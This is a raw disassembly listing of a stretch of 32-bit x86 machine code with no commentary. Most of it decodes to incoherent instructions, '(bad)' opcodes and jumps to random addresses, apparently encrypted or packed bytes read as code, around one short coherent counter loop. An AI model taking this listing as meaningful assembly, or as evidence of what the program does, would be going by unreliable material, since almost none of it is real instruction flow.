  41d6cc:	les    esp,FWORD PTR [edi+0x3d66e9de]
  41d6d2:	mov    eax,ds:0x77fdf1c
  41d6d7:	sbb    ebx,DWORD PTR [edi+0x6de987a6]
  41d6dd:	(bad)  
  41d6df:	js     0x41d716
  41d6e1:	mov    esp,0xa7d2134e
  41d6e6:	cs pop ebx
  41d6e8:	xor    eax,0x3d1806a9
  41d6ed:	daa    
  41d6ee:	loop   0x41d68c
  41d6f0:	mov    DWORD PTR [ecx],eax
  41d6f2:	test   al,0x79
  41d6f4:	or     bl,BYTE PTR [esi-0x1f4c44c6]
  41d6fa:	or     DWORD PTR [edi+ecx*1+0x5],ebp
  41d6fe:	or     eax,0x5ea24e3a
  41d703:	sbb    cl,BYTE PTR [eax+0xa]
  41d706:	mov    ds:0xecc5dd42,al
  41d70b:	repnz (bad) 
  41d70e:	call   0x8b7502cb
  41d713:	enter  0x1387,0x58
  41d717:	jns    0x41d729
  41d719:	jno    0x41d764
  41d71b:	addr16 pop es
  41d71d:	or     DWORD PTR [ecx],edi
  41d71f:	mov    cs,WORD PTR [edi+edi*8+0x47a1e0e8]
  41d726:	lods   al,BYTE PTR ds:[esi]
  41d727:	mov    eax,0x7339dff1
  41d72c:	mov    ah,0xc1
  41d72e:	(bad)  
  41d730:	sti    
  41d731:	dec    esi
  41d732:	jecxz  0x41d746
  41d734:	out    0x93,eax
  41d736:	leave  
  41d737:	loopne 0x41d73c
  41d739:	(bad)  
  41d73a:	repz sub eax,0x64eb6e6
  41d740:	push   cs
  41d741:	(bad)  
  41d743:	jbe    0x41d776
  41d745:	pop    edi
  41d746:	xor    DWORD PTR [ebp-0x33e00a3a],esi
  41d74c:	into   
  41d74d:	cmp    al,0xca
  41d74f:	fsubr  QWORD PTR [eax+0x6a]
  41d752:	stc    
  41d753:	adc    dh,dh
  41d755:	cmp    ah,BYTE PTR [esi+0xe53bd53]
  41d75b:	mov    esi,0x44d81096
  41d760:	out    0xdf,eax
  41d762:	inc    ecx
  41d763:	xchg   edi,eax
  41d764:	sub    eax,0x33d352fa
  41d769:	pop    es
  41d76a:	mov    eax,ds:0x93eea3ca
  41d76f:	fst    DWORD PTR [ebp-0x79f9b6d4]
  41d775:	addr16 das 
  41d777:	push   eax
  41d778:	icebp  
  41d779:	repz mov ds:0x3bcf0cac,eax
  41d77f:	mov    esi,0x737553c8
  41d784:	div    BYTE PTR [ecx-0x40]
  41d787:	mov    ebx,0x5b706872
  41d78c:	into   
  41d78d:	aam    0x3b
  41d78f:	and    ebx,esp
  41d791:	pop    esi
  41d792:	push   ebx
  41d793:	mov    esi,0x2e54817b
  41d798:	data16 jne 0x41d722
  41d79b:	dec    eax
  41d79c:	mov    al,0x79
  41d79e:	std    
  41d79f:	inc    ebx
  41d7a0:	push   eax
  41d7a1:	(bad)  
  41d7a2:	mov    ds:0x79ac8fe1,al
  41d7a7:	push   edx
  41d7a8:	mov    al,ds:0xba84b18b
  41d7ad:	adc    edi,DWORD PTR [ebx+0x1d]
  41d7b0:	or     dh,BYTE PTR [eax-0x260e3232]
  41d7b6:	mov    dl,0x3
  41d7b8:	pop    es
  41d7b9:	sub    ebx,0x49
  41d7bc:	(bad)  
  41d7be:	add    DWORD PTR [edx+0x75],0x5ee71811
  41d7c5:	inc    esi
  41d7c6:	pusha  
  41d7c7:	xchg   ebp,eax
  41d7c8:	xor    DWORD PTR [esi+esi*8+0x66],edi
  41d7cc:	and    cl,BYTE PTR [ecx+0x3b]
  41d7cf:	xchg   edi,eax
  41d7d0:	jmp    0xfb00:0x994acec6
  41d7d7:	adc    esi,DWORD PTR [ecx+0x7ab2aa8a]
  41d7dd:	ret    
  41d7de:	add    bh,dl
  41d7e0:	adc    dh,BYTE PTR [esi]
  41d7e2:	mov    esi,0x223ca232
  41d7e7:	stos   BYTE PTR es:[edi],al
  41d7e8:	int    0x51
  41d7ea:	add    esp,0x62dff35e
  41d7f0:	xor    dh,dh
  41d7f2:	ficomp WORD PTR [ebx+0x40]
  41d7f5:	sub    al,0x7e
  41d7f7:	(bad)  
  41d7f8:	and    ch,BYTE PTR [esi-0x4fa5023b]
  41d7fe:	sbb    al,0x78
  41d800:	xchg   esp,eax
  41d801:	aas    
  41d802:	mov    dh,0x5e
  41d804:	add    ecx,edx
  41d806:	pusha  
  41d807:	mov    ebx,DWORD PTR [ebx+0x4f]
  41d80a:	sub    DWORD PTR [edi],edi
  41d80c:	add    DWORD PTR [ecx-0x4a],edi
  41d80f:	out    0xef,eax
  41d811:	cmp    ch,BYTE PTR [ecx]
  41d813:	out    dx,eax
  41d814:	out    0xba,al
  41d816:	inc    edi
  41d817:	mov    bl,dl
  41d819:	call   0xc5c08878
  41d81e:	data16 jl 0x41d7fc
  41d821:	pmullw mm4,QWORD PTR [esi-0x33d84464]
  41d828:	imul   ecx,DWORD PTR [ebx],0xd451f6ec
  41d82e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d82f:	push   ds
  41d830:	pop    ds
  41d831:	outs   dx,BYTE PTR ds:[esi]
  41d832:	outs   dx,BYTE PTR ds:[esi]
  41d833:	inc    ebp
  41d834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d835:	cmp    al,0xac
  41d837:	add    DWORD PTR [eax-0xe],ebx
  41d83a:	add    eax,0x9313df9d
  41d83f:	lods   al,BYTE PTR ds:[esi]
  41d840:	inc    esp
  41d841:	scas   eax,DWORD PTR es:[edi]
  41d842:	jmp    0x632b:0x6815348b
  41d849:	das    
  41d84a:	fbld   TBYTE PTR [eax]
  41d84c:	out    dx,eax
  41d84d:	scas   al,BYTE PTR es:[edi]
  41d84e:	or     bh,ah
  41d850:	fmul   st(2),st
  41d852:	out    dx,al
  41d853:	test   DWORD PTR [ebp+0x6ad8d757],0xbbf4f559
  41d85d:	jg     0x41d8d6
  41d85f:	fbld   TBYTE PTR [edi]
  41d861:	cs dec edx
  41d863:	pop    ecx
  41d864:	pop    es
  41d865:	or     BYTE PTR [edx+0x653a09ae],0xd6
  41d86c:	mov    dh,0x51
  41d86e:	fdivr  QWORD PTR [ebx+0x780a2527]
  41d874:	jo     0x41d869
  41d876:	and    al,BYTE PTR [eax+edx*4]
  41d879:	outs   dx,DWORD PTR ds:[esi]
  41d87a:	in     al,0x72
  41d87c:	aas    
  41d87d:	inc    edi
  41d87e:	jge    0x41d8c8
  41d880:	repz mov dh,0x48
  41d883:	addr16 jle 0x41d835
  41d886:	jge    0x41d85e
  41d888:	ins    BYTE PTR es:[edi],dx
  41d889:	rol    BYTE PTR ds:0x7856186f,cl
  41d88f:	sub    dh,BYTE PTR ds:0x528adcc9
  41d895:	imul   esp,DWORD PTR [edi+0x24b1d47f],0xffffffd9
  41d89c:	and    eax,0xb32bb044
  41d8a1:	jmp    0x41d90f
  41d8a3:	test   BYTE PTR [ebp-0x3b],al
  41d8a6:	dec    eax
  41d8a7:	enter  0x55b8,0xde
  41d8ab:	nop
  41d8ac:	add    eax,eax
  41d8ae:	cmp    esi,0xffffffeb
  41d8b1:	sbb    DWORD PTR [ecx+0x7d],edi
  41d8b4:	call   0x683218ff
  41d8b9:	mov    cl,0x5a
  41d8bb:	pushw  0x34
  41d8be:	mov    ah,0x42
  41d8c0:	lods   eax,DWORD PTR ds:[esi]
  41d8c1:	jns    0x41d868
  41d8c3:	pop    esi
  41d8c4:	int    0x1f
  41d8c6:	mov    bl,ch
  41d8c8:	mov    ds:0x70c791e1,al
  41d8cd:	lahf   
  41d8ce:	mov    cl,0x38
  41d8d0:	test   eax,0x4a458460
  41d8d5:	clc    
  41d8d6:	imul   edx,DWORD PTR [edi-0x51609d21],0x8f0c48f0
  41d8e0:	push   ds
  41d8e1:	call   0xea581e87
  41d8e6:	into   
  41d8e7:	imul   edi,DWORD PTR [ebx],0x66fb2761
  41d8ed:	imul   eax,ebp,0x8dcbccc8
  41d8f3:	inc    esp
  41d8f4:	nop
  41d8f5:	cmc    
  41d8f6:	jne    0x41d891
  41d8f8:	push   edx
  41d8f9:	push   cs
  41d8fa:	ret    0x27bc
  41d8fd:	fwait
  41d8fe:	ret    0xb0dc
  41d901:	and    bl,bl
  41d903:	(bad)  
  41d904:	(bad)  
  41d905:	xor    dh,dl
  41d907:	(bad)  
  41d908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d909:	jne    0x41d908
  41d90b:	pop    esi
  41d90c:	mov    al,0x65
  41d90e:	sub    eax,0xf504e6ca
  41d913:	mov    edi,0x7c9257da
  41d918:	test   DWORD PTR [ebp-0x1a],ecx
  41d91b:	push   edi
  41d91c:	pushf  
  41d91d:	ds mov dl,0x8b
  41d920:	into   
  41d921:	pop    ecx
  41d922:	(bad)  
  41d924:	jnp    0x41d8a8
  41d926:	fadd   DWORD PTR [eax-0x35]
  41d929:	xchg   ebp,eax
  41d92a:	mov    ch,0x1d
  41d92c:	std    
  41d92d:	das    
  41d92e:	and    ebp,DWORD PTR [edi-0x12c4cb07]
  41d934:	popa   
  41d935:	shl    BYTE PTR [ecx-0x2d4b58d5],cl
  41d93b:	fwait
  41d93c:	mov    BYTE PTR [eax],cl
  41d93e:	mov    cl,ah
  41d940:	sbb    ecx,ebp
  41d942:	jp     0x41d8fb
  41d944:	inc    esi
  41d945:	(bad)  
  41d946:	cmc    
  41d947:	out    dx,al
  41d948:	and    dl,ch
  41d94a:	jle    0x41d8f8
  41d94c:	sub    BYTE PTR [ecx],dl
  41d94e:	les    esp,FWORD PTR [ecx-0x9]
  41d951:	sub    cl,al
  41d953:	in     al,dx
  41d954:	lea    esp,[eax]
  41d956:	or     eax,0xd456288b
  41d95b:	jge    0x41d927
  41d95d:	and    BYTE PTR [edx],ah
  41d95f:	loopne 0x41d9bb
  41d961:	pusha  
  41d962:	mov    al,0x34
  41d964:	in     al,dx
  41d965:	rol    DWORD PTR [eax-0x4e8abf89],1
  41d96b:	(bad)  
  41d96c:	mov    esp,0xb4e80cfc
  41d971:	adc    bl,BYTE PTR [edx-0x78af6243]
  41d977:	sar    DWORD PTR [eax],cl
  41d979:	jp     0x41d97c
  41d97b:	mov    ah,0xd9
  41d97d:	cmp    edi,DWORD PTR [esi-0x601ecf]
  41d983:	push   0x80162eab
  41d988:	xor    al,0xd3
  41d98a:	or     DWORD PTR [esi-0x68],esp
  41d98d:	ins    BYTE PTR es:[edi],dx
  41d98e:	and    ebx,DWORD PTR [esi-0x3590bd15]
  41d994:	xchg   DWORD PTR [edi+0x74],ebp
  41d997:	mov    ebp,0x432b2dff
  41d99c:	(bad)  
  41d99d:	fdivr  DWORD PTR [ecx]
  41d99f:	fstp   DWORD PTR [ebx+ebp*4-0x7e819477]
  41d9a6:	ins    BYTE PTR es:[edi],dx
  41d9a7:	adc    ah,bh
  41d9a9:	mov    ds:0x7ce260cf,eax
  41d9ae:	push   eax
  41d9af:	movmskps ecx,xmm3
  41d9b2:	sub    al,0x20
  41d9b4:	push   ds
  41d9b5:	xchg   ebp,eax
  41d9b6:	dec    ebp
  41d9b7:	mov    ebp,0x26b3616
  41d9bc:	sub    esi,esi
  41d9be:	and    BYTE PTR [ecx+0x11ab1dee],dl
  41d9c4:	popa   
  41d9c5:	cmp    BYTE PTR [edi],0x2d
  41d9c8:	push   esi
  41d9c9:	loop   0x41da31
  41d9cb:	jge    0x41d970
  41d9cd:	lea    bp,[ebp+0x6a]
  41d9d1:	fisub  DWORD PTR [ecx]
  41d9d3:	xor    al,0x7
  41d9d5:	mov    dl,0x8d
  41d9d7:	push   eax
  41d9d8:	or     DWORD PTR [ebp-0x37],esp
  41d9db:	fwait
  41d9dc:	arpl   WORD PTR [ecx+0x369f8b2b],di
  41d9e2:	or     DWORD PTR [esi+0xe],edi
  41d9e5:	popa   
  41d9e6:	jae    0x41da2f
  41d9e8:	dec    BYTE PTR [ecx+0x7794ab04]
  41d9ee:	add    al,0x7e
  41d9f0:	push   edi
  41d9f1:	pop    es
  41d9f2:	push   ax
  41d9f4:	dec    ecx
  41d9f5:	adc    DWORD PTR [ecx],ebp
  41d9f7:	out    0xd4,al
  41d9f9:	rol    DWORD PTR [esi+0xed90d9b],cl
  41d9ff:	es das 
  41da01:	mov    edi,eax
  41da03:	sub    edx,DWORD PTR [ebp-0x7]
  41da06:	test   eax,ebx
  41da08:	or     bl,bl
  41da0a:	test   BYTE PTR [edi+eax*4],bl
  41da0d:	pop    edx
  41da0e:	sbb    bh,bl
  41da10:	bound  esi,QWORD PTR [edi-0x49]
  41da13:	add    al,0xdb
  41da15:	sbb    cl,BYTE PTR [ebx]
  41da17:	(bad)  
  41da19:	lea    edi,[eax+ecx*4+0xe]
  41da1d:	ss push ss
  41da1f:	ja     0x41da9d
  41da21:	or     eax,0x59865eb7
  41da26:	gs add ch,al
  41da29:	add    DWORD PTR [ebp-0x36c73fc1],ecx
  41da2f:	aas    
  41da30:	push   ecx
  41da31:	push   esp
  41da32:	dec    ecx
  41da33:	ja     0x41da3d
  41da35:	mov    esi,0xf34aed0d
  41da3a:	xchg   esp,eax
  41da3b:	test   dl,dl
  41da3d:	push   edx
  41da3e:	into   
  41da3f:	out    0x68,eax
  41da41:	scas   al,BYTE PTR es:[edi]
  41da42:	idiv   BYTE PTR [edx*1-0x1ec9c07b]
  41da49:	jb     0x41da3e
  41da4b:	mov    esp,0x1eb9b78a
  41da50:	psrlq  mm1,QWORD PTR ds:0x8ea407ca
  41da57:	dec    eax
  41da58:	sub    BYTE PTR [ecx-0x141d8015],ah
  41da5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da5f:	inc    edx
  41da60:	pop    ebp
  41da61:	inc    ebx
  41da62:	cmp    eax,0xeaae168f
  41da67:	bound  ebx,QWORD PTR cs:[ebx]
  41da6a:	fimul  WORD PTR cs:[esi+0xa504b19]
  41da71:	jg     0x41dacc
  41da73:	add    eax,0xce3768b
  41da78:	stos   BYTE PTR es:[edi],al
  41da79:	cdq    
  41da7a:	mov    eax,ds:0x4a89a78d
  41da7f:	ja     0x41dab0
  41da81:	cmp    eax,0xffffffed
  41da84:	sub    ch,BYTE PTR [ecx+0x1d8db509]
  41da8a:	or     ch,ah
  41da8c:	xor    DWORD PTR [esi+eiz*8-0x570ba01d],0x14b59f86
  41da97:	aaa    
  41da98:	cli    
  41da99:	lods   eax,DWORD PTR ds:[esi]
  41da9a:	retf   
  41da9b:	repz adc bl,BYTE PTR [edi-0x31]
  41da9f:	cli    
  41daa0:	into   
  41daa1:	fidiv  DWORD PTR [edx]
  41daa3:	aaa    
  41daa4:	popa   
  41daa5:	inc    eax
  41daa6:	xchg   ecx,esi
  41daa8:	popf   
  41daa9:	loopne 0x41daae
  41daab:	lock les eax,FWORD PTR [esi-0x39]
  41daaf:	sub    BYTE PTR [edx-0x48],0x4b
  41dab3:	or     DWORD PTR [eax-0x27c46914],0xffffffee
  41daba:	popf   
  41dabb:	pop    edx
  41dabc:	popf   
  41dabd:	aaa    
  41dabe:	push   ds
  41dabf:	push   ds
  41dac0:	outs   dx,DWORD PTR fs:[esi]
  41dac2:	ret    
  41dac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dac4:	cmc    
  41dac5:	lods   al,BYTE PTR ds:[esi]
  41dac6:	data16 (bad) 
  41dac8:	(bad)  
  41dac9:	jge    0x41daa5
  41dacb:	cld    
  41dacc:	test   BYTE PTR [edi],dl
  41dace:	sahf   
  41dacf:	nop
  41dad0:	popf   
  41dad1:	(bad)  
  41dad2:	adc    al,0xeb
  41dad4:	pop    eax
  41dad5:	xchg   edi,eax
  41dad6:	jb     0x41daa9
  41dad8:	sub    edx,DWORD PTR [edi-0x39e90762]
  41dade:	outs   dx,DWORD PTR ds:[esi]
  41dadf:	add    ebp,DWORD PTR [ecx-0x46]
  41dae2:	dec    ebx
  41dae3:	sub    eax,0x5b9b214e
  41dae8:	add    esi,edi
  41daea:	add    bh,bl
  41daec:	cmp    BYTE PTR [edi],0xef
  41daef:	pop    edx
  41daf0:	mov    WORD PTR [eax-0x9bfcafd],?
  41daf6:	test   eax,0x77d44906
  41dafb:	fs sti 
  41dafd:	mov    ds:0x794d130,al
  41db02:	cmp    eax,0x619a6fc2
  41db07:	fcomip st,st(1)
  41db09:	call   DWORD PTR [ecx+0x5f]
  41db0c:	mov    al,0xd7
  41db0e:	loop   0x41daff
  41db10:	xchg   edi,eax
  41db11:	loope  0x41dad2
  41db13:	push   ebx
  41db14:	add    ecx,0xd90d2f5d
  41db1a:	in     eax,0xc1
  41db1c:	data16 (bad) 
  41db1e:	arpl   cx,di
  41db20:	add    DWORD PTR [esi],0x5dfc8c37
  41db26:	out    0x6e,al
  41db28:	mov    DWORD PTR [ebp+0x7f752777],edx
  41db2e:	and    al,0x64
  41db30:	dec    ebx
  41db31:	pop    ds
  41db32:	mov    cl,0xf2
  41db34:	mov    al,ds:0xa5ade12e
  41db39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db3a:	repnz in al,dx
  41db3c:	push   ss
  41db3d:	mov    al,ds:0xcb4104a
  41db42:	jbe    0x41dad2
  41db44:	pop    ds
  41db45:	xchg   esi,eax
  41db46:	inc    ebp
  41db47:	(bad)  
  41db48:	sbb    ecx,ebx
  41db4a:	(bad)  
  41db4b:	cmp    eax,0x541f350
  41db50:	mov    edi,0x3c9a0152
  41db55:	shr    edi,1
  41db57:	loopne 0x41db0d
  41db59:	pop    ss
  41db5a:	mov    ecx,0x15d70ab0
  41db5f:	push   ebp
  41db60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db61:	mov    edi,0xf337efbf
  41db66:	xchg   ecx,eax
  41db67:	lds    esi,FWORD PTR [eax+0x1b]
  41db6a:	xchg   edi,eax
  41db6b:	inc    eax
  41db6c:	ret    0x578b
  41db6f:	mov    ch,0x51
  41db71:	xchg   edx,eax
  41db72:	mov    edi,0xbb6fb726
  41db77:	and    eax,0xac4cae23
  41db7c:	jle    0x41dbe7
  41db7e:	xor    al,0xe7
  41db80:	and    al,0xb1
  41db82:	loope  0x41dbcb
  41db84:	mov    ebx,0x5805b526
  41db89:	mov    ebp,0x20008f8e
  41db8e:	(bad)  
  41db8f:	bound  eax,QWORD PTR [ebp-0x48]
  41db92:	stos   BYTE PTR es:[edi],al
  41db93:	cmp    eax,0x79788874
  41db98:	push   ebp
  41db99:	call   0x3efb56d9
  41db9e:	retf   0xb1ce
  41dba1:	daa    
  41dba2:	iret   
  41dba3:	pop    edx
  41dba4:	or     eax,0x9d9c869e
  41dba9:	imul   BYTE PTR [eax+ebp*2+0x4401a4f7]
  41dbb0:	sbb    BYTE PTR [ecx-0x7c],bl
  41dbb3:	cdq    
  41dbb4:	ret    
  41dbb5:	mov    ecx,0x4ca303e
  41dbba:	rol    DWORD PTR [edi],0x36
  41dbbd:	cmp    bh,BYTE PTR [eax+0x5c2ec715]
  41dbc3:	inc    eax
  41dbc4:	sub    al,BYTE PTR [esi]
  41dbc6:	sbb    bh,bl
  41dbc8:	pop    esi
  41dbc9:	mov    dh,0x7f
  41dbcb:	nop
  41dbcc:	das    
  41dbcd:	outs   dx,BYTE PTR ds:[esi]
  41dbce:	mov    bl,0xd9
  41dbd0:	jmp    0x41dbad
  41dbd2:	inc    edi
  41dbd3:	stos   DWORD PTR es:[edi],eax
  41dbd4:	push   ebp
  41dbd5:	in     eax,0x21
  41dbd7:	mov    DWORD PTR [eiz*8-0x26cde6b1],eax
  41dbde:	xchg   BYTE PTR [ebp-0x29e4bea4],ah
  41dbe4:	cmc    
  41dbe5:	scas   al,BYTE PTR es:[edi]
  41dbe6:	xor    BYTE PTR [ebp+0x9474a36],dh
  41dbec:	popf   
  41dbed:	jge    0x41dc18
  41dbef:	fimul  WORD PTR [ecx+0xd8bf045]
  41dbf5:	fidiv  WORD PTR [ecx+0xd210042]
  41dbfb:	adc    dh,BYTE PTR [edx+0x75810042]
  41dc01:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc03:	mov    ch,0x9c
  41dc05:	clc    
  41dc06:	mov    eax,DWORD PTR [ebp-0x18]
  41dc09:	mov    DWORD PTR ds:0x42b19a,0x12
  41dc13:	cmp    DWORD PTR ds:0x42b19a,0x0
  41dc1a:	je     0x41fffa
  41dc20:	cmp    DWORD PTR ds:0x42b19a,0x4
  41dc27:	jle    0x41fffa
  41dc2d:	jmp    0x41dc3b
  41dc32:	push   DWORD PTR [ebp-0x18]
  41dc35:	call   DWORD PTR ds:0x42b2f2
  41dc3b:	cmp    DWORD PTR ds:0x42b19a,0x5
  41dc42:	jne    0x41dc57
  41dc48:	xor    ecx,ecx
  41dc4a:	add    ecx,DWORD PTR ds:0x42b19a
  41dc50:	dec    ecx
  41dc51:	mov    DWORD PTR ds:0x42b19a,ecx
  41dc57:	mov    ecx,DWORD PTR ds:0x42b19a
  41dc5d:	dec    ecx
  41dc5e:	mov    DWORD PTR ds:0x42b19a,ecx
  41dc64:	jmp    0x41dc13
  41dc69:	jmp    0x41fffa
  41dc6e:	push   cs
  41dc6f:	mov    BYTE PTR [edi-0x79d57893],0x82
  41dc76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc77:	mov    dl,0xfb
  41dc79:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41dc7b:	adc    ah,BYTE PTR [edi-0x6d]
  41dc7e:	jp     0x41dc5b
  41dc80:	add    BYTE PTR [ebx-0x7c7ca1f1],0x8a
  41dc87:	(bad)  
  41dc88:	xchg   esp,eax
  41dc89:	or     al,0xb3
  41dc8b:	scas   eax,DWORD PTR es:[edi]
  41dc8c:	lea    ebx,[esi-0x34ae3e8a]
  41dc92:	call   0xb54153b1
  41dc97:	shl    BYTE PTR [ebx],cl
  41dc99:	xchg   BYTE PTR [ebx],dl
  41dc9b:	push   ds
  41dc9c:	mov    ah,0x41
  41dc9e:	in     al,dx
  41dc9f:	and    BYTE PTR [ebx],ch
  41dca1:	bound  ebp,QWORD PTR [edx-0x5]
  41dca4:	mov    edi,0x8934b9ac
  41dca9:	jecxz  0x41dcbe
  41dcab:	les    esi,FWORD PTR [esi]
  41dcad:	mov    esi,0xbf4a9e2a
  41dcb2:	cmp    al,0xf0
  41dcb4:	call   0xcce0:0x25c7076e
  41dcbb:	fs adc eax,0x8ddc8417
  41dcc1:	and    al,BYTE PTR [esi+0x8]
  41dcc4:	mov    BYTE PTR [edx-0x46],bl
  41dcc7:	cwde   
  41dcc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcc9:	ror    DWORD PTR [ecx],cl
  41dccb:	loop   0x41dca0
  41dccd:	mov    eax,ds:0x3840e0bb
  41dcd2:	sbb    DWORD PTR [edx],esp
  41dcd4:	fnstcw WORD PTR [edi+0x6a]
  41dcd7:	inc    ecx
  41dcd8:	aaa    
  41dcd9:	into   
  41dcda:	cmovbe ebx,DWORD PTR [ecx-0x34]
  41dcde:	or     eax,0x7f9734fb
  41dce3:	loopne 0x41dd0f
  41dce5:	pop    ss
  41dce6:	push   esp
  41dce7:	stos   DWORD PTR es:[edi],eax
  41dce8:	mov    dl,0xfd
  41dcea:	loop   0x41dcaf
  41dcec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dced:	xlat   BYTE PTR ds:[ebx]
  41dcee:	test   BYTE PTR [esp+ecx*8],dl
  41dcf1:	cmp    edx,esp
  41dcf3:	popa   
  41dcf4:	push   eax
  41dcf5:	and    eax,0x745267f9
  41dcfa:	cmp    al,ah
  41dcfc:	rcl    bl,1
  41dcfe:	es xchg edi,eax
  41dd00:	mov    cl,0x69
  41dd02:	stc    
  41dd03:	fidivr DWORD PTR [eax]
  41dd05:	or     ah,BYTE PTR [edi+0x6b]
  41dd08:	push   ebp
  41dd09:	cmp    DWORD PTR [ecx-0x245706f1],ebp
  41dd0f:	fiadd  DWORD PTR es:[ebx+edx*4+0x42373c2]
  41dd17:	mov    ecx,0x30265235
  41dd1c:	div    DWORD PTR [esi]
  41dd1e:	push   esi
  41dd1f:	add    BYTE PTR [ebx],dh
  41dd21:	jle    0x41dd90
  41dd23:	retf   0xf95c
  41dd26:	lods   al,BYTE PTR ds:[esi]
  41dd27:	cmp    DWORD PTR [eax-0x71],ecx
  41dd2a:	outs   dx,BYTE PTR ds:[esi]
  41dd2b:	shl    ecx,1
  41dd2d:	call   0x3dad:0x9aabd82c
  41dd34:	xor    dh,BYTE PTR [ecx+0x36]
  41dd37:	push   esp
  41dd38:	call   0x733a08c7
  41dd3d:	ret    0xd37f
  41dd40:	or     eax,0x99fc1321
  41dd45:	icebp  
  41dd46:	sar    ecx,1
  41dd48:	fldln2 
  41dd4a:	mov    dh,0x19
  41dd4c:	xor    dl,BYTE PTR [esi+0x2f984924]
  41dd52:	mov    WORD PTR [ecx+edx*2-0x3542df1d],ss
  41dd59:	jg     0x41dd32
  41dd5b:	and    DWORD PTR cs:[edx],ebx
  41dd5e:	jge    0x41ddc5
  41dd60:	outs   dx,DWORD PTR ds:[esi]
  41dd61:	pop    ds
  41dd62:	cli    
  41dd63:	adc    eax,0xfd0e3712
  41dd68:	dec    eax
  41dd69:	and    al,0x2
  41dd6b:	jecxz  0x41ddd7
  41dd6d:	aaa    
  41dd6e:	inc    esp
  41dd6f:	test   al,0x1a
  41dd71:	cmp    DWORD PTR [edi+eax*2+0x2a1fad0d],ebx
  41dd78:	rcl    DWORD PTR [ebx+0x37],1
  41dd7b:	adc    edi,DWORD PTR [esi+ebx*8-0x73]
  41dd7f:	xor    eax,0xd24dc7
  41dd84:	fwait
  41dd85:	jecxz  0x41dde8
  41dd87:	xor    BYTE PTR [ebx+0x1be2a1da],ch
  41dd8d:	fsubr  DWORD PTR [edi-0x692cea28]
  41dd93:	clc    
  41dd94:	xor    DWORD PTR [edi+esi*1-0x6d],edi
  41dd98:	mov    eax,ds:0xd57f8b44
  41dd9d:	pop    ds
  41dd9e:	out    dx,eax
  41dd9f:	iret   
  41dda0:	jmp    0xc30b:0xeda0895
  41dda7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dda8:	pop    edx
  41dda9:	xchg   ebx,eax
  41ddaa:	lock jle 0x41dd7b
  41ddad:	and    eax,ebx
  41ddaf:	push   ebp
  41ddb0:	in     eax,0xe5
  41ddb2:	push   ebx
  41ddb3:	sub    al,0xf
  41ddb5:	aam    0x21
  41ddb7:	and    BYTE PTR [ecx-0x34],ah
  41ddba:	mov    ah,0xc3
  41ddbc:	das    
  41ddbd:	retf   
  41ddbe:	mov    eax,ds:0x17894b16
  41ddc3:	push   eax
  41ddc4:	add    al,0x35
  41ddc6:	pop    edx
  41ddc7:	pop    ebx
  41ddc8:	mov    WORD PTR [eax],ds
  41ddca:	pop    edx
  41ddcb:	jnp    0x41dde8
  41ddcd:	pop    edx
  41ddce:	popf   
  41ddcf:	push   cs
  41ddd0:	dec    ebx
  41ddd1:	pop    ebp
  41ddd2:	mov    ah,0x33
  41ddd4:	sbb    bh,BYTE PTR [esi+ebp*1+0x4b06bcc6]
  41dddb:	adc    eax,0x8245d43
  41dde0:	xor    eax,0x4ff0b693
  41dde5:	push   0xfffffffa
  41dde7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dde8:	push   esi
  41dde9:	lahf   
  41ddea:	lahf   
  41ddeb:	gs cs ins DWORD PTR es:[edi],dx
  41ddee:	loopne 0x41ddd8
  41ddf0:	xor    BYTE PTR [esi-0x75],cl
  41ddf3:	sbb    DWORD PTR [esi+0x26],esi
  41ddf6:	xchg   BYTE PTR ds:0x8d749b75,cl
  41ddfc:	sub    ch,dl
  41ddfe:	adc    DWORD PTR gs:[ebp-0x5c],edi
  41de02:	cmp    al,0x32
  41de04:	xchg   DWORD PTR [ecx+0x1a],eax
  41de07:	pop    ecx
  41de08:	sbb    eax,0xce7996b1
  41de0d:	repnz pop ebp
  41de0f:	(bad)  
  41de10:	loopne 0x41dde3
  41de12:	inc    esp
  41de13:	out    0xe,eax
  41de15:	loop   0x41de45
  41de17:	in     eax,dx
  41de18:	ret    
  41de19:	mov    al,ds:0x96d57518
  41de1e:	mov    ebx,DWORD PTR [ecx]
  41de20:	xchg   esi,eax
  41de21:	mov    dl,0x1f
  41de23:	bound  esi,QWORD PTR [ebx-0x42cbbfe6]
  41de29:	inc    ebp
  41de2a:	add    ah,cl
  41de2c:	mov    esi,0x398d1fa1
  41de31:	mov    dh,0xa2
  41de33:	popa   
  41de34:	push   edx
  41de35:	push   0xffffff8d
  41de37:	test   BYTE PTR [edx-0x51518463],bh
  41de3d:	jl     0x41de3b
  41de3f:	in     al,0xc8
  41de41:	fmul   QWORD PTR [ebp+0x79]
  41de44:	sbb    BYTE PTR ds:0xf8f91852,bl
  41de4a:	or     BYTE PTR [ebp+0x2e802648],bh
  41de50:	out    0x2a,al
  41de52:	imul   edi,esi,0xffffff83
  41de55:	mov    ds:0xf88802bc,al
  41de5a:	mov    dh,0x50
  41de5c:	jbe    0x41de2a
  41de5e:	jmp    0x41de51
  41de60:	push   ecx
  41de61:	fmul   st(7),st
  41de63:	pop    ds
  41de64:	fist   DWORD PTR [edx+0x50]
  41de67:	test   al,dh
  41de69:	mov    eax,ds:0xddeaf5f7
  41de6e:	mov    bl,0x8b
  41de70:	inc    edi
  41de71:	jmp    0x41de9c
  41de73:	pop    eax
  41de74:	mul    DWORD PTR [eax+0x7101aebf]
  41de7a:	sub    ecx,0xffffffdc
  41de7d:	fs pop ebx
  41de7f:	xchg   ecx,eax
  41de80:	leave  
  41de81:	or     BYTE PTR [ebp+0x2f570f77],0x8d
  41de88:	cli    
  41de89:	xchg   edx,eax
  41de8a:	mov    ?,WORD PTR [ebx-0x4e903aa]
